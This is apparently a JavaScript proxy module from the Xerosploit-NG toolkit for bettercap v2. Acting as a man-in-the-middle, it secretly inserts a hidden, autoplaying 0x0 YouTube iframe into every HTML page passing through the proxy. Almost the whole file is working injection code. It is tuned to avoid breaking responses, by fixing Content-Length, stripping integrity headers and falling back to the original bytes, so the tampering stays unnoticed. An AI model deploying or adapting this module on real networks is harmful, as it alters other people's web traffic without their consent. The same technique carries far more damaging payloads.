// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- RickRoll (YouTube hijack)
//
// Inserts an autoplaying, 0x0 YouTube <iframe> into every proxied text/html
// response, using the video id from the generated global XE_VIDEO_ID.
//
// Ported from the bettercap v1 Ruby proxy module:
//   modules/rickroll.rb   (GPLv3)
// v1 read a pre-rendered `tmp/yplay.txt` iframe and did
// `response.body.sub!('<head>', contents)`; here the iframe is built from
// XE_VIDEO_ID and inserted right after <head> (the same effect), with
// </head> / end-of-document fallbacks.  HTTPS is used for the embed URL.
// Backs the "YouTube Play" (yplay) menu entry of Xerosploit.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_VIDEO_ID  YouTube video id, e.g. "NvhZu5M41Z8".
//
// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
// "body modified" flag, so after the body has been read this module MUST write
// a body back or bettercap emits an EMPTY response.  The decision to rewrite
// is therefore made from method/status/headers alone; only then is the body
// read exactly once.  Every exit path after that read sets the body and a
// Content-Length equal to the UTF-8 byte length of the string it writes:
// either the injected bytes, or the byte-exact original when the rewrite throws.
// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
// touched.  A response this module does not handle is left byte-identical.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "rickroll";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
function xeGetHeader(headers, name) {
    if (!headers) { return null; }
    var want = ("" + name).toLowerCase();
    var key;
    for (key in headers) {
        if (("" + key).toLowerCase() === want) {
            var value = headers[key];
            if (value === null || value === undefined) { return null; }
            return value;
        }
    }
    return null;
}

// Decide, from method/status/headers ALONE (no body read), whether this
// response may be rewritten as a full-body 200.
function xeSkipResponse(req, res) {
    if (!req || req.Method !== "GET") { return true; }
    if (!res || res.Status !== 200) { return true; }
    if (xeGetHeader(req.Headers, "Range")) { return true; }
    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
    return false;
}

var XE_STALE_HEADERS = [
    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
];

function xeWriteBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
}

function xeReplaceBody(res, body, contentType) {
    if (typeof res.RemoveHeader === "function") {
        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
            res.RemoveHeader(XE_STALE_HEADERS[i]);
        }
    }
    if (contentType && typeof res.SetHeader === "function") {
        res.SetHeader("Content-Type", contentType);
    }
    xeWriteBody(res, body);
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

// Only [A-Za-z0-9_-] survive: keeps the id from breaking out of the attribute.
function xeSanitizeVideoId(id) {
    return ("" + (id === null || id === undefined ? "" : id)).replace(/[^A-Za-z0-9_-]/g, "");
}

function onLoad() {
    var vid = (typeof XE_VIDEO_ID === "undefined") ? null : XE_VIDEO_ID;
    xeLog("loaded (video id: " + vid + ")");
}

function onResponse(req, res) {
    // Decide from headers/URL only; a skipped response is never read or mutated.
    if (!xeIsHtml(res)) { return; }
    if (xeSkipResponse(req, res)) { return; }

    var vid = xeSanitizeVideoId((typeof XE_VIDEO_ID === "undefined") ? null : XE_VIDEO_ID);
    if (!vid) { xeWarn("XE_VIDEO_ID is not set; passing through"); return; }

    var iframe = "<iframe width='0' height='0' src='https://www.youtube.com/embed/" +
        vid + "?autoplay=1' frameborder='0' allowfullscreen></iframe>";

    // Committed to rewriting: read the body exactly once and always write back.
    var original = null;
    try {
        original = xeReadBody(res);
        if (typeof original !== "string") { return; }

        var out = original;
        var lower = original.toLowerCase();
        var at = lower.indexOf("<head>");
        if (at !== -1) {
            out = original.substring(0, at + 6) + iframe + original.substring(at + 6);
        } else {
            at = lower.indexOf("</head>");
            if (at !== -1) { out = original.substring(0, at) + iframe + original.substring(at); }
            else { out = original + iframe; }
        }

        var where = (req && req.Hostname ? req.Hostname : "") + (req && req.Path ? req.Path : "");
        xeLog("inserting YouTube iframe (" + vid + ") into " + where);

        if (out !== original) {
            xeReplaceBody(res, out, (typeof res.ContentType === "string" && res.ContentType) ? res.ContentType : "text/html");
        } else {
            xeWriteBody(res, original);
        }
    } catch (e) {
        xeWarn("onResponse failed: " + e);
        if (typeof original === "string") {
            xeWriteBody(res, original);                                  // fail-open: exact original bytes
        }
    }
}
